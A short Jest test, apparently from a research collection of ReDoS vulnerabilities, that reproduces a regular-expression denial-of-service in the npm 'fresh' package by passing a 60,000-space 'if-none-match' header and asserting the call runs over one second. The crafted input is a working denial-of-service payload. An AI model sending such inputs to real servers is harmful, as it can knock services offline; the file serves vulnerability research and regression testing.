//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-fresh.js
test("ReDos in fresh", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  var fresh = require("fresh");

  let str = genstr(60000, " ") + "x"; //progblematic regex: / *, */, in fresh/index.js

  let t = measureTime(function () {
    fresh(
      {
        "if-none-match": str,
      },
      {
        etag: 23,
      }
    );
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
